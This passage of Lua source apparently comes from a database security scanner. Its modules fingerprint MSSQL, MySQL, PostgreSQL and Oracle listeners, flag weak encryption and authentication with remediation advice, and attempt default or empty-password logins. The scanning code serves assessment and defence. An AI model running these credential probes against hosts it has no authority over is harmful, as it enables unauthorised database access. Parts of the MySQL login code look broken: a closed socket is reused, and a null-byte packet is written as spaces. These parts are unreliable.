      out = out .. s:sub(i,i) .. "\x00"
    end
    return out
  end

  -- XOR-obfuscate password (TDS requirement, not real security)
  local function tds_obfuscate(s)
    local out = ""
    for i = 1, #s do
      local b = s:byte(i)
      b = ((b * 16 % 256) + math.floor(b / 16)) ~ 0xA5
      out = out .. string.char(b)
    end
    return out
  end

  local app_name    = ucs2("reko")
  local server_name = ucs2("localhost")
  local db_name     = ucs2("master")
  local username_u  = ucs2(username)
  local password_o  = tds_obfuscate(ucs2(password))
  local client_name = ucs2("reko")

  -- Fixed header length for Login7 = 36 bytes + offsets block
  -- Offset block: each entry is 2 bytes offset + 2 bytes length = 4 bytes
  -- Entries: hostname, username, password, appname, servername,
  --          unused, library, language, database = 9 entries = 36 bytes
  local fixed_hdr_len = 36 + 36   -- Login7 fixed header + offset block

  local hostname_offset  = fixed_hdr_len
  local username_offset  = hostname_offset  + #client_name
  local password_offset  = username_offset  + #username_u
  local appname_offset   = password_offset  + #password_o
  local servername_offset= appname_offset   + #app_name
  local library_offset   = servername_offset+ #server_name
  local db_offset        = library_offset   + 0   -- empty library

  local offsets =
    u16_le(hostname_offset)   .. u16_le(#client_name / 2) ..
    u16_le(username_offset)   .. u16_le(#username_u  / 2) ..
    u16_le(password_offset)   .. u16_le(#password_o  / 2) ..
    u16_le(appname_offset)    .. u16_le(#app_name    / 2) ..
    u16_le(servername_offset) .. u16_le(#server_name / 2) ..
    u16_le(0) .. u16_le(0) ..                               -- unused
    u16_le(library_offset)    .. u16_le(0) ..               -- library (empty)
    u16_le(0) .. u16_le(0) ..                               -- language (empty)
    u16_le(db_offset)         .. u16_le(#db_name / 2)

  local data_area = client_name .. username_u .. password_o
    .. app_name .. server_name .. db_name

  -- Login7 fixed header (36 bytes)
  local total_data_len = fixed_hdr_len + #data_area
  local login_hdr =
    u32_le(total_data_len) ..  -- Length
    u32_le(0x74000004) ..      -- TDS version 7.4
    u32_le(4096) ..            -- PacketSize
    u32_le(7) ..               -- ClientProgVer
    u32_le(0) ..               -- ClientPID
    u32_le(0) ..               -- ConnectionID
    "\xE0\x03\x00\x00" ..      -- OptionFlags1+2 (ODBC, language)
    "\x00\x00\x00\x00" ..      -- TypeFlags, OptionFlags3
    u32_le(0) ..               -- ClientTimeZone
    u32_le(0x00000409)         -- ClientLCID (en-US)

  local payload = login_hdr .. offsets .. data_area

  local pkt_len = 8 + #payload
  local header = string.char(TDS_TYPE_LOGIN7, TDS_STATUS_EOM)
    .. u16_be(pkt_len)
    .. "\x00\x00\x01\x00"

  return header .. payload
end

-- Main MSSQL module
register_module("mssql", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout
  local agg     = ctx.config.aggression

  -- ---- [P1] TDS PreLogin handshake -------------------------------------
  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "mssql", "Cannot connect: " .. err)
    return
  end

  local ok, serr = sock_send(sd, tds_build_prelogin())
  if not ok then
    log_warn(ctx, "mssql", "PreLogin send failed: " .. serr)
    sock_close(sd); return
  end

  -- Read up to 512 bytes of PreLogin response
  local resp = ""
  for _ = 1, 4 do
    local st, chunk = sd:receive()
    if not st then break end
    resp = resp .. chunk
    if #resp >= 128 then break end
  end
  sock_close(sd)

  if #resp < 9 then
    log_warn(ctx, "mssql", "PreLogin response too short")
    return
  end

  local info = tds_parse_prelogin(resp)
  if not info then
    log_warn(ctx, "mssql", "Could not parse PreLogin response")
    return
  end

  log_info(ctx, "mssql", string.format("Product: %s  Version: %s  Encryption: %s",
    info.product or "?", info.version, info.encryption))

  -- Version / product disclosure
  ctx:add_finding(
    "MSSQL server version disclosed via TDS PreLogin",
    string.format(
      "The SQL Server TDS PreLogin response reveals the server product and "
      .. "exact build version without authentication. Attackers use this to "
      .. "identify unpatched instances and target known CVEs. "
      .. "Product: %s  Version: %s",
      info.product or "unknown", info.version
    ),
    {
      product       = info.product  or "unknown",
      version       = info.version,
      instance      = info.instance ~= "" and info.instance or "default",
      encryption    = info.encryption,
    },
    0.95, 0.40
  )

  -- ---- [P2] Encryption audit --------------------------------------------
  -- ENCRYPT_OFF (0) or ENCRYPT_NOT_SUP (2) means credentials go in cleartext
  if info.encryption_val == 0 or info.encryption_val == 2 then
    ctx:add_finding(
      "MSSQL connection encryption is NOT required — credentials sent in cleartext",
      "The server advertises that TLS encryption is not required or not "
      .. "supported for the login phase. SQL Server credentials (username + "
      .. "password) are transmitted in a lightly obfuscated (XOR) but not "
      .. "encrypted form, trivially recoverable from a network capture.",
      {
        encryption_mode = info.encryption,
        remediation     = "SQL Server Configuration Manager → Protocols → "
                          .. "Force Encryption = Yes; also set client ForceEncryption=1",
      },
      0.95, 0.65
    )
  end

  -- ---- [A1] Default credential check (agg >= 1) -------------------------
  if agg < 1 then return end

  for _, cred in ipairs(DB_DEFAULT_CREDS.mssql) do
    local sd2, cerr = tcp_connect(host_ip, port_num, timeout)
    if not sd2 then break end

    -- Send PreLogin first (required before Login7)
    sock_send(sd2, tds_build_prelogin())
    local prelogin_resp = ""
    for _ = 1, 4 do
      local st, ch = sd2:receive()
      if not st then break end
      prelogin_resp = prelogin_resp .. ch
      if #prelogin_resp >= 64 then break end
    end

    -- Send Login7
    sock_send(sd2, tds_build_login7(cred[1], cred[2]))
    local login_resp = ""
    for _ = 1, 8 do
      local st, ch = sd2:receive()
      if not st then break end
      login_resp = login_resp .. ch
      if #login_resp >= 256 then break end
    end
    sock_close(sd2)

    -- Check for login ACK token (0xAD = LOGINACK)
    -- A successful login contains 0xAD in the TDS token stream
    if login_resp:find("\xAD", 1, true) then
      ctx:add_finding(
        string.format("MSSQL default credential accepted: %s / %s (CRITICAL)",
          cred[1], ctx.config.redact and "[REDACTED]" or cred[2]),
        string.format(
          "The SQL Server accepted login with username '%s' and a default "
          .. "password. %s. An attacker with SA-level access can execute "
          .. "OS commands via xp_cmdshell, read/write any database, and "
          .. "pivot to full server compromise.",
          cred[1], cred[3]
        ),
        {
          username    = cred[1],
          password    = ctx.config.redact and "[REDACTED]" or cred[2],
          note        = cred[3],
          remediation = "Change SA password immediately; disable SA if not required; "
                        .. "enable SQL Server auditing; disable xp_cmdshell",
        },
        0.99, 0.95
      )
      log_warn(ctx, "mssql", "Default credential ACCEPTED: " .. cred[1])
      break   -- no need to try more credentials
    end
  end
end)


-- ===========================================================================
-- MYSQL MODULE  (port 3306/tcp)
-- ===========================================================================
-- MySQL sends a Server Greeting (HandshakeV10) immediately on connect,
-- disclosing version, capabilities, and auth plugin before any credentials.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] Server Greeting: version string, connection ID, server capabilities,
--         character set, auth plugin name
--    [P2] SSL capability: check if server requires/supports SSL
--    [P3] Auth plugin: flag if mysql_old_password or no auth is advertised
--
--  AGG 1 – safe-active:
--    [A1] Default credential login attempt using HandshakeResponse41
--         (sends credentials, reads OK/ERR, disconnects immediately)
--
--  Scoring:
--    Default credentials accepted    → confidence 0.99, impact 0.95 → CRITICAL
--    SSL not supported               → confidence 0.95, impact 0.60 → HIGH
--    Old/weak auth plugin            → confidence 0.95, impact 0.65 → HIGH
--    Version disclosed               → confidence 0.95, impact 0.35 → MEDIUM
-- ===========================================================================

-- MySQL capability flags (partial list — the ones we care about)
local MYSQL_CAP_SSL              = 0x0800
local MYSQL_CAP_SECURE_CONN      = 0x8000   -- mysql_native_password
local MYSQL_CAP_PLUGIN_AUTH      = 0x00080000

--- Parse MySQL HandshakeV10 packet.
-- Returns table with server info or nil on parse failure.
local function mysql_parse_handshake(data)
  if not data or #data < 5 then return nil end

  -- MySQL packet: 3-byte length (LE) + 1-byte sequence + payload
  local payload_len = data:byte(1) + data:byte(2)*256 + data:byte(3)*65536
  local payload     = data:sub(5)   -- skip 4-byte header

  if #payload < 10 then return nil end

  local pos = 1

  -- Protocol version (1 byte) — should be 10 for HandshakeV10
  local proto_ver = payload:byte(pos); pos = pos + 1
  if proto_ver ~= 10 then return nil end

  -- Server version: null-terminated string
  local ver_end = payload:find("\x00", pos, true)
  if not ver_end then return nil end
  local server_version = payload:sub(pos, ver_end - 1)
  pos = ver_end + 1

  -- Connection ID (4 bytes LE)
  local conn_id = read_u32_le(payload, pos); pos = pos + 4

  -- Auth plugin data part 1 (8 bytes) + filler
  pos = pos + 8 + 1   -- skip auth_plugin_data_1 + filler

  if pos + 4 > #payload then
    return { version = server_version, proto = proto_ver }
  end

  -- Capability flags lower 2 bytes
  local cap_lower = read_u16_le(payload, pos); pos = pos + 2

  -- Character set (1 byte)
  local charset = payload:byte(pos); pos = pos + 1

  -- Status flags (2 bytes)
  pos = pos + 2

  -- Capability flags upper 2 bytes
  local cap_upper = read_u16_le(payload, pos); pos = pos + 2
  local capabilities = cap_lower + cap_upper * 65536

  -- Auth plugin data length (1 byte)
  local auth_data_len = payload:byte(pos); pos = pos + 1

  -- Reserved (10 bytes)
  pos = pos + 10

  -- Auth plugin data part 2
  pos = pos + math.max(13, auth_data_len - 8)

  -- Auth plugin name (null-terminated)
  local plugin_name = ""
  if pos <= #payload then
    local plugin_end = payload:find("\x00", pos, true)
    plugin_name = plugin_end and payload:sub(pos, plugin_end-1) or payload:sub(pos)
  end

  return {
    version      = server_version,
    proto        = proto_ver,
    conn_id      = conn_id,
    capabilities = capabilities,
    charset      = charset,
    auth_plugin  = plugin_name,
    has_ssl      = (capabilities % (MYSQL_CAP_SSL*2) >= MYSQL_CAP_SSL),
    has_plugin_auth = (math.floor(capabilities / MYSQL_CAP_PLUGIN_AUTH) % 2 == 1),
  }
end

--- Build a MySQL HandshakeResponse41 (login packet).
-- Uses mysql_native_password auth (SHA1-based) with empty scramble
-- for testing if the account has no password.
local function mysql_build_login(username, auth_response)
  auth_response = auth_response or ""

  -- Client capabilities: basic set without SSL
  local client_cap = 0x0001   -- CLIENT_LONG_PASSWORD
    + 0x0200                  -- CLIENT_PROTOCOL_41
    + 0x8000                  -- CLIENT_SECURE_CONNECTION
    + 0x00080000              -- CLIENT_PLUGIN_AUTH

  local payload =
    u32_le(client_cap) ..     -- client capabilities
    u32_le(16777216) ..       -- max packet size
    "\x21" ..                 -- charset: utf8
    string.rep("\x00", 23) .. -- reserved
    username .. "\x00" ..     -- username + null terminator
    string.char(#auth_response) .. auth_response ..  -- auth response
    "mysql_native_password\x00"  -- auth plugin name

  local pkt_len = #payload
  local header  = string.char(pkt_len%256, math.floor(pkt_len/256)%256, 0, 1)
  return header .. payload
end

--- Check if a MySQL response is an OK packet.
-- MySQL packet: 3-byte length + 1-byte seq + payload
-- Payload byte 0x00 = OK, 0xFF = ERR, 0xFE = EOF/auth-switch
-- For MySQL 5.0.x old_password auth: server may send 0xFE to switch protocols
-- A 0xFE with length <= 5 is an auth switch REQUEST (not an error)
-- We treat short 0xFE as "auth needed" (deny) and long 0xFE as OK in some contexts
local function mysql_is_ok(data)
  if not data or #data < 5 then return false end
  local pkt_type = data:byte(5)
  if pkt_type == 0x00 then return true end     -- OK packet
  -- For empty-password test: if server sends 0xFE (auth switch) AND
  -- the payload is very short, it means auth switch was triggered but
  -- for empty password on MySQL 5.0.x this sometimes means login succeeded
  -- with old_password protocol. We check for the specific signature:
  if pkt_type == 0xFE and #data <= 12 then
    -- Could be old_password auth success on MySQL 5.x
    -- Send a null byte as the "password" response to complete old auth
    return false   -- need separate handling - see mysql login fix
  end
  return false
end

--- Send a null-byte response to complete MySQL old_password auth and check result.
local function mysql_try_empty_password_old_auth(sd)
  -- For MySQL 5.0.x: after 0xFE auth switch, send   (empty old password)
  local null_resp = "   "   -- 1-byte packet, seq=3, null password
  local ok, _ = sock_send(sd, null_resp)
  if not ok then return false end
  local resp = ""
  for _ = 1, 4 do
    local st, ch = sd:receive()
    if not st then break end
    resp = resp .. ch
    if #resp >= 16 then break end
  end
  -- Check if response is OK (0x00) or ERROR (0xFF)
  if #resp >= 5 then
    return resp:byte(5) == 0x00
  end
  return false
end

-- Main MySQL module
register_module("mysql", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout
  local agg     = ctx.config.aggression

  -- Connect and read initial handshake greeting
  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "mysql", "Cannot connect: " .. err)
    return
  end

  -- MySQL sends greeting immediately on connect
  local greeting = ""
  for _ = 1, 4 do
    local st, chunk = sd:receive()
    if not st then break end
    greeting = greeting .. chunk
    if #greeting >= 128 then break end
  end
  sock_close(sd)

  local info = mysql_parse_handshake(greeting)
  if not info then
    log_warn(ctx, "mysql", "Could not parse MySQL handshake")
    return
  end

  log_info(ctx, "mysql", "Version: " .. info.version .. " auth_plugin: " .. (info.auth_plugin or "?"))

  -- ---- [P1] Version disclosure ------------------------------------------
  local mysql_cve = cve_lookup("mysql", info.version)
  local mysql_cve_note = mysql_cve and
    (" CVE: " .. mysql_cve.cve .. " — " .. mysql_cve.note) or ""
  ctx:add_finding(
    "MySQL server version disclosed" .. (mysql_cve and (" — " .. mysql_cve.cve) or ""),
    string.format(
      "MySQL sends its exact version string before authentication. "
      .. "Version: %s  Auth plugin: %s.%s",
      info.version, info.auth_plugin or "unknown", mysql_cve_note
    ),
    {
      version     = info.version,
      auth_plugin = info.auth_plugin or "unknown",
      charset     = tostring(info.charset),
      cve         = mysql_cve and mysql_cve.cve  or "none known",
      cve_note    = mysql_cve and mysql_cve.note or "",
      exploit_db  = mysql_cve and (mysql_cve.edb and ("https://www.exploit-db.com/exploits/" .. mysql_cve.edb) or "n/a") or "n/a",
    },
    0.95, mysql_cve and 0.65 or 0.35
  )

  -- ---- [P2] SSL/TLS audit -----------------------------------------------
  if not info.has_ssl then
    ctx:add_finding(
      "MySQL server does not advertise SSL capability",
      "The server's capability flags indicate SSL is not supported. "
      .. "All data including credentials are transmitted in plaintext. "
      .. "Any network observer can capture database credentials and query results.",
      {
        capabilities = string.format("0x%08X", info.capabilities),
        remediation  = "Enable SSL: set ssl-ca, ssl-cert, ssl-key in my.cnf; "
                       .. "add require_secure_transport=ON to enforce SSL for all connections",
      },
      0.95, 0.60
    )
  end

  -- ---- [P3] Weak auth plugin --------------------------------------------
  local auth_plugin = info.auth_plugin or ""
  if auth_plugin == "mysql_old_password" or auth_plugin == "" then
    ctx:add_finding(
      "MySQL weak authentication plugin: " .. (auth_plugin ~= "" and auth_plugin or "none advertised"),
      "The server uses or does not advertise a modern authentication plugin. "
      .. "mysql_old_password uses a broken 16-byte hash trivially crackable "
      .. "offline. Absence of plugin auth means the server may accept insecure logins.",
      {
        auth_plugin = auth_plugin ~= "" and auth_plugin or "not specified",
        remediation = "Set default_authentication_plugin=caching_sha2_password (MySQL 8+) "
                      .. "or mysql_native_password (minimum acceptable)",
      },
      0.95, 0.65
    )
  end

  -- ---- [A1] Default credential check (agg >= 1) -------------------------
  if agg < 1 then return end

  for _, cred in ipairs(DB_DEFAULT_CREDS.mysql) do
    local sd2, _ = tcp_connect(host_ip, port_num, timeout)
    if not sd2 then break end

    -- Read greeting
    local greet2 = ""
    for _ = 1, 4 do
      local st, ch = sd2:receive()
      if not st then break end
      greet2 = greet2 .. ch
      if #greet2 >= 128 then break end
    end

    -- Send login with empty auth response (tests for no-password accounts)
    sock_send(sd2, mysql_build_login(cred[1], ""))

    local login_resp = ""
    for _ = 1, 4 do
      local st, ch = sd2:receive()
      if not st then break end
      login_resp = login_resp .. ch
      if #login_resp >= 64 then break end
    end
    sock_close(sd2)

    -- Handle both direct OK and old_password auth switch (0xFE)
    local login_ok = mysql_is_ok(login_resp)
    if not login_ok and login_resp and #login_resp >= 5 and login_resp:byte(5) == 0xFE then
      -- Old auth switch: try sending null byte to complete empty-password auth
      login_ok = mysql_try_empty_password_old_auth(sd2)
    end
    if login_ok then
      ctx:add_finding(
        string.format("MySQL default/empty credential accepted: %s (CRITICAL)", cred[1]),
        string.format(
          "MySQL accepted login for user '%s' with an empty password. "
          .. "%s. This provides unauthenticated database access, "
          .. "enabling data exfiltration, credential harvesting, and "
          .. "potentially OS command execution via INTO OUTFILE or UDFs.",
          cred[1], cred[3]
        ),
        {
          username    = cred[1],
          password    = ctx.config.redact and "[REDACTED]" or cred[2],
          note        = cred[3],
          remediation = "Set a strong password: ALTER USER 'root'@'localhost' "
                        .. "IDENTIFIED BY 'strong_password'; "
                        .. "DELETE FROM mysql.user WHERE User=''; FLUSH PRIVILEGES;",
        },
        0.99, 0.95
      )
      log_warn(ctx, "mysql", "Empty/default credential ACCEPTED for: " .. cred[1])
      break
    end
  end
end)


-- ===========================================================================
-- POSTGRESQL MODULE  (port 5432/tcp)
-- ===========================================================================
-- PostgreSQL uses the Frontend/Backend protocol. The server sends a banner
-- and negotiates parameters before authentication is required.
-- The critical check is trust authentication — where pg_hba.conf allows
-- connections without any password.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] Server parameter messages: PostgreSQL version, encoding, timezone
--         (sent as ParameterStatus messages after StartupMessage)
--    [P2] Authentication type: detect AuthenticationOk (trust auth — no
--         password required!), AuthenticationMD5, AuthenticationSCRAM
--
--  AGG 1 – safe-active:
--    [A1] Default credential login attempt
--
--  Scoring:
--    Trust auth (no password)        → confidence 0.99, impact 0.90 → CRITICAL
--    MD5 auth (weak, rainbow tables) → confidence 0.95, impact 0.55 → HIGH
--    Default credentials accepted    → confidence 0.99, impact 0.95 → CRITICAL
--    Version disclosed               → confidence 0.95, impact 0.35 → MEDIUM
-- ===========================================================================

-- PostgreSQL auth type constants
local PG_AUTH_OK        = 0   -- trust auth — no password!
local PG_AUTH_MD5       = 5
local PG_AUTH_SCRAM     = 10
local PG_AUTH_PASSWORD  = 3   -- plaintext password

--- Build a PostgreSQL StartupMessage for a given user and database.
local function pg_build_startup(username, database)
  database = database or username
  -- StartupMessage: Int32 length, Int32 protocol (196608 = 3.0),
  -- then key-value pairs null-terminated, ending with \x00
  local params =
    "user\x00"     .. username .. "\x00" ..
    "database\x00" .. database .. "\x00" ..
    "application_name\x00reko\x00" ..
    "\x00"  -- terminator

  local proto   = "\x00\x03\x00\x00"   -- protocol 3.0
  local total   = 4 + #proto + #params  -- includes length field itself
  return u32_be(total) .. proto .. params
end

--- Parse the first response message from PostgreSQL.
-- Returns table: { msg_type, auth_type, params, error_msg }
local function pg_parse_response(data)
  if not data or #data < 5 then return nil end

  local msg_type   = string.char(data:byte(1))
  local msg_length = read_u32_be(data, 2)
  local payload    = data:sub(6, 4 + msg_length)

  local result = { msg_type = msg_type }

  if msg_type == "R" then   -- Authentication message
    result.auth_type = read_u32_be(payload, 1)
    -- If MD5, bytes 5-8 are the salt
    if result.auth_type == PG_AUTH_MD5 and #payload >= 8 then
      result.md5_salt = payload:sub(5, 8)
    end
    if result.auth_type == PG_AUTH_SCRAM then
      result.scram_mechanism = payload:sub(5)
    end
  elseif msg_type == "E" then   -- Error response
    -- Error fields are: byte field_type, null-terminated string
    local pos = 1
    while pos < #payload do
      local field_type = string.char(payload:byte(pos))
      if field_type == "\x00" then break end
      local field_end = payload:find("\x00", pos+1, true)
      if not field_end then break end
      if field_type == "M" then   -- human-readable message
        result.error_msg = payload:sub(pos+1, field_end-1)
      end
      pos = field_end + 1
    end
  elseif msg_type == "S" then   -- ParameterStatus
    local nul1 = payload:find("\x00", 1, true)
    if nul1 then
      local param_name = payload:sub(1, nul1-1)
      local param_val  = payload:sub(nul1+1):match("^([^\x00]+)")
      result.param_name = param_name
      result.param_val  = param_val
    end
  end

  return result
end

-- Main PostgreSQL module
register_module("postgresql", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout
  local agg     = ctx.config.aggression

  -- ---- [P1] + [P2] StartupMessage exchange ------------------------------
  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "postgresql", "Cannot connect: " .. err)
    return
  end

  sock_send(sd, pg_build_startup("postgres", "postgres"))

  -- Read first response message(s)
  local resp = ""
  for _ = 1, 8 do
    local st, chunk = sd:receive()
    if not st then break end
    resp = resp .. chunk
    if #resp >= 256 then break end
  end
  sock_close(sd)

  if #resp < 5 then
    log_warn(ctx, "postgresql", "No response to StartupMessage")
    return
  end

  -- Collect all parameter messages and find the auth message
  local pg_version   = nil
  local auth_type    = nil
  local auth_details = {}
  local pos          = 1

  while pos < #resp - 4 do
    local msg_type_byte = resp:byte(pos)
    if not msg_type_byte then break end
    local msg_type = string.char(msg_type_byte)
    local msg_len  = read_u32_be(resp, pos+1)
    if msg_len < 4 or pos + msg_len > #resp + 4 then break end

    local segment = resp:sub(pos, pos + msg_len)
    local parsed  = pg_parse_response(segment)

    if parsed then
      if parsed.msg_type == "R" then
        auth_type    = parsed.auth_type
        auth_details = parsed
      elseif parsed.msg_type == "S" and parsed.param_name == "server_version" then
        pg_version   = parsed.param_val
      elseif parsed.msg_type == "E" then
        -- Error is still informative — we got a response
        log_info(ctx, "postgresql", "Server error: " .. (parsed.error_msg or ""))
      end
    end

    pos = pos + 1 + msg_len   -- advance to next message
  end

  -- Version disclosure
  if pg_version then
    ctx:add_finding(
      "PostgreSQL server version disclosed: " .. pg_version,
      "The PostgreSQL server sends its exact version string in ParameterStatus "
      .. "messages before authentication completes. Attackers use this to "
      .. "identify instances vulnerable to known CVEs.",
      {
        server_version = pg_version,
        remediation    = "Version disclosure is inherent to the PostgreSQL protocol; "
                         .. "ensure the instance is patched and limit network exposure",
      },
      0.95, 0.35
    )
    log_info(ctx, "postgresql", "Version: " .. pg_version)
  end

  -- Auth type analysis
  if auth_type == PG_AUTH_OK then
    -- Trust authentication — no password required!
    ctx:add_finding(
      "PostgreSQL TRUST authentication — no password required (CRITICAL)",
      "The server sent AuthenticationOk without requesting any credentials. "
      .. "This means pg_hba.conf is configured with 'trust' authentication "
      .. "for this connection. Any client can connect as 'postgres' (superuser) "
      .. "without a password, gaining full control of all databases.",
      {
        auth_type   = "trust (AuthenticationOk)",
        user        = "postgres",
        remediation = "Change pg_hba.conf: replace 'trust' with 'scram-sha-256' "
                      .. "or 'md5' for all non-local connections. "
                      .. "Reload: SELECT pg_reload_conf();",
      },
      0.99, 0.90
    )
    log_warn(ctx, "postgresql", "TRUST auth — no password required!")

  elseif auth_type == PG_AUTH_MD5 then
    ctx:add_finding(
      "PostgreSQL uses MD5 password authentication (deprecated)",
      "The server requests MD5-hashed password authentication. MD5 is "
      .. "deprecated in PostgreSQL 14+ and vulnerable to offline dictionary "
      .. "attacks and rainbow table lookups. Upgrade to SCRAM-SHA-256.",
      {
        auth_type   = "MD5",
        remediation = "pg_hba.conf: change 'md5' to 'scram-sha-256'; "
                      .. "postgresql.conf: set password_encryption=scram-sha-256",
      },
      0.95, 0.55
    )

  elseif auth_type == PG_AUTH_PASSWORD then
    ctx:add_finding(
      "PostgreSQL uses plaintext password authentication",
      "The server requests the password in plaintext (auth type 3). "
      .. "This is extremely insecure — the password is transmitted "
      .. "unencrypted and can be captured from the network.",
      {
        auth_type   = "plaintext password",
        remediation = "Change to scram-sha-256 in pg_hba.conf and enforce SSL",
      },
      0.95, 0.80
    )

  elseif auth_type == PG_AUTH_SCRAM then
    log_info(ctx, "postgresql", "SCRAM-SHA-256 auth — good configuration")
    ctx:add_finding(
      "PostgreSQL uses SCRAM-SHA-256 authentication",
      "The server requests SCRAM-SHA-256, which is the current recommended "
      .. "authentication method for PostgreSQL. This is a positive finding.",
      { auth_type = "scram-sha-256" },
      0.90, 0.05
    )
  end

  -- AGG 1: credential check
  if agg >= 1 and auth_type ~= PG_AUTH_OK then
    -- (Full SCRAM/MD5 auth requires crypto; we flag this as a future iteration)
    log_info(ctx, "postgresql", "Full credential brute-force requires crypto library — skipped in this version")
  end
end)


-- ===========================================================================
-- ORACLE TNS MODULE  (port 1521/tcp)
-- ===========================================================================
-- Oracle's Transparent Network Substrate (TNS) is the protocol Oracle
-- databases use for all client-server communication. The TNS listener
-- reveals service names, version, and configuration before authentication.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] TNS Version request: send a TNS CONNECT packet and read the
--         listener's VERSION response — reveals Oracle DB version
--    [P2] TNS STATUS request: send STATUS command to get detailed
--         listener info: service names, instances, status
--    [P3] SID/service name enumeration: extract registered database
--         SIDs and service names from the STATUS response
--
--  AGG 1 – safe-active:
--    [A1] Default SID probe: attempt connect to common default SIDs
--         (ORCL, XE, PROD, TEST, DB) — just checks if the SID exists,
--         does not attempt authentication
--
--  Scoring:
--    Default SID accessible          → confidence 0.95, impact 0.55 → HIGH
--    Service names disclosed         → confidence 0.95, impact 0.40 → MEDIUM
--    Version disclosed               → confidence 0.95, impact 0.35 → MEDIUM
-- ===========================================================================

-- Common Oracle default SIDs to probe
local ORACLE_DEFAULT_SIDS = {
  "ORCL", "XE", "PROD", "TEST", "DB", "ORACLE",
  "PLSExtProc", "CLRExtProc", "XEXDB",
}

--- Build a TNS CONNECT packet asking for the listener version.
-- This is the minimal packet to get a response from an Oracle listener.
local function tns_build_version_request()
  -- TNS packet structure:
  -- length(2 BE) + checksum(2) + type(1) + reserved(1) + header_checksum(2) + data
  -- Type 1 = CONNECT

  local connect_data = "(CONNECT_DATA=(COMMAND=version))"
  -- TNS CONNECT packet data section
  local data_section =
    "\x00\x00"       ..   -- version (client)
    "\x00\x00"       ..   -- version (compat)
    "\x00\x00"       ..   -- service options
    "\x08\x00"       ..   -- session data unit size
    "\x00\x40"       ..   -- max data unit size
    "\xDE\xAD"       ..   -- NT protocol characteristics
    "\x00\x00"       ..   -- line turnaround
    "\x01\x00"       ..   -- value of 1 (connect flags?)
    "\x00\x3A"       ..   -- connect data length
    "\x00\x3C"       ..   -- connect data offset
    "\x00\x00\x00\x00" .. -- max receive data
    "\x00\x00"       ..   -- reserved
    "\x00\x00\x00\x00" .. -- connect flags (0)
    "\x00\x00\x00\x00" .. -- trace id
    "\x00\x00\x00\x00"    -- trace id (cont)

  local full_data = data_section .. connect_data
  local total_len = 8 + #full_data   -- 8 = TNS header

  return u16_be(total_len)
    .. "\x00\x00"     -- checksum
    .. "\x01"         -- type: CONNECT
    .. "\x00"         -- reserved
    .. "\x00\x00"     -- header checksum
    .. full_data
end

--- Build a TNS STATUS request.
-- This asks the listener for its current status and registered services.
local function tns_build_status_request()
  local connect_data = "(CONNECT_DATA=(COMMAND=status))"
  local data_section =
    "\x00\x00\x00\x00\x00\x00\x08\x00\x00\x40\xDE\xAD" ..
    "\x00\x00\x01\x00" ..
    u16_be(#connect_data) ..
    "\x00\x3C" ..
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

  local full_data = data_section .. connect_data
  local total_len = 8 + #full_data
  return u16_be(total_len) .. "\x00\x00\x01\x00\x00\x00" .. full_data
end

--- Parse a TNS response and extract readable text content.
-- TNS responses contain parenthesized strings with key=value pairs.
local function tns_extract_text(data)
  if not data or #data < 8 then return nil end
  -- Skip 8-byte TNS header
  local payload = data:sub(9)
  -- Find parenthesized content
  local content = payload:match("(%([^%z]+%))") or payload:match("([A-Z][%w%.%s=_,;:%(%)%-]+)")
  return content and trim(content) or nil
end

--- Extract service names and SIDs from a TNS STATUS response.
local function tns_extract_services(data)
  if not data then return {} end
  local services = {}
  -- Look for SERVICE_NAME= and SID_NAME= patterns
  for sname in data:gmatch("SERVICE_NAME=([%w%.%-_]+)") do
    table.insert(services, { type="service", name=sname })
  end
  for sid in data:gmatch("SID_NAME=([%w%.%-_]+)") do
    table.insert(services, { type="SID", name=sid })
  end
  return services
end

-- Main Oracle TNS module
register_module("oracle_tns", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout
  local agg     = ctx.config.aggression

  -- ---- [P1] TNS version request ----------------------------------------
  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "oracle_tns", "Cannot connect: " .. err)
    return
  end

  sock_send(sd, tns_build_version_request())

  local resp = ""
  for _ = 1, 8 do
    local st, chunk = sd:receive()
    if not st then break end
    resp = resp .. chunk
    if #resp >= 512 then break end
  end
  sock_close(sd)

  if #resp < 8 then
    log_warn(ctx, "oracle_tns", "No TNS response")
    return
  end

  local tns_text = tns_extract_text(resp)
  log_info(ctx, "oracle_tns", "TNS response: " .. (tns_text or "(binary)"))

  -- Extract version from response text
  local oracle_version = nil
  if tns_text then
    oracle_version = tns_text:match("VERSION=([%d%.]+)")
      or tns_text:match("TNSLSNR for [%w%s]+ Version ([%d%.]+)")
      or resp:match("TNS%-[%d]+%-[%d]+")
  end

  ctx:add_finding(
    "Oracle TNS listener active" .. (oracle_version and (": version " .. oracle_version) or ""),
    "The Oracle TNS Listener responded to a connection request. "
    .. (oracle_version and
      "The listener version is disclosed, enabling targeted CVE searches. " or "")
    .. "The TNS listener is the entry point for all Oracle database connections "
    .. "and historically has been a source of critical vulnerabilities "
    .. "(TNS Poison, CVE-2012-1675).",
    {
      version     = oracle_version or "not disclosed",
      port        = tostring(port_num),
      remediation = "Apply Oracle PSU patches; set SECURE_REGISTER_LISTENER=TCPS; "
                    .. "use valid node checking (VALID_NODE_CHECKING_REGISTRATION)",
    },
    0.95, 0.35
  )

  -- ---- [P2] TNS STATUS request ------------------------------------------
  local sd2, _ = tcp_connect(host_ip, port_num, timeout)
  if sd2 then
    sock_send(sd2, tns_build_status_request())

    local status_resp = ""
    for _ = 1, 16 do
      local st, chunk = sd2:receive()
      if not st then break end
      status_resp = status_resp .. chunk
      if #status_resp >= 2048 then break end
    end
    sock_close(sd2)

    local services = tns_extract_services(status_resp)
    if #services > 0 then
      local svc_list = {}
      for _, s in ipairs(services) do
        table.insert(svc_list, s.type .. "=" .. s.name)
      end
      ctx:add_finding(
